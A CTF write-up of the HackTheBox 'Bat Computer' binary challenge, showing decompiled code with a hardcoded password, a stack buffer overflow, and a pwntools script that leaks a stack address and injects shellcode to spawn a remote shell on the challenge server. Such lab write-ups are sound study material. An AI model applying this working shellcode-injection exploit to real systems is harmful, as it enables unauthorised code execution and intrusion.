---

title: HTB [BAT COMPUTER] [PWN]

date: 2022-06-03 01:57:05 +0200

categories: [pwn,htb]

tags: [Intro to Binary Exploitation]

excerpt: Write up for the challenge "Bat Computer" from HackTheBox
---

## Bat computer

**Analysis:**

```css
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
- We don't have nx, seems like we need to execute shellcode here

![](https://i.imgur.com/uCzpFvJ.png)
- And option **1** gives us a stack leak, for now let's assume our buffer starts here..

**Decompile main()**

```c
undefined8 main(void)

{
  int iVar1;
  int local_68;
  char acStack100 [16];
  undefined auStack84 [76];
  
  FUN_001011a9();
  while( true ) {
    while( true ) {
      memset(acStack100,0,0x10);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Chase Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&local_68);
      if (local_68 != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p\n",auStack84);
    }
    if (local_68 != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,acStack100);
    iVar1 = strcmp(acStack100,"b4tp@$$w0rd!");
    if (iVar1 != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,auStack84,0x89);
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}
```

- In option 2 there's a `strcmp()`  we can get that password easily by reading the decompile code
- If we enter that correctly then we can able to give `0x89` bytes input to `auStack84` array, which is only `76` bytes long
- So we can give 61 bytes more than the allocated space

**Plan:**
- First let's give our shellcode
- Then let's fill the junk till the rbp
- Finally let's overwrite the return address with the leaked address (that we got from the option 1)

**Exploit script:**

```python
from pwn import *

context.binary = ELF('./batcomputer')
p = remote('142.93.39.44',31365)


p.sendline('1')
p.recvuntil('0x')
stack_base = int(("0x"+p.recv().decode('latin-1').split()[0]),16)
log.success(f'stack base: {hex(stack_base)}')
p.sendline('2')
p.sendline('b4tp@$$w0rd!')
payload = asm(shellcraft.popad() + shellcraft.sh()) # shellcode
payload += b'A'*(84 - len(payload)) # junk
payload += p64(stack_base) # stack base

p.sendline(payload)
p.sendline('3')
p.interactive()
```

![](https://i.imgur.com/edqZ3TO.png)
- Cool we got our flag
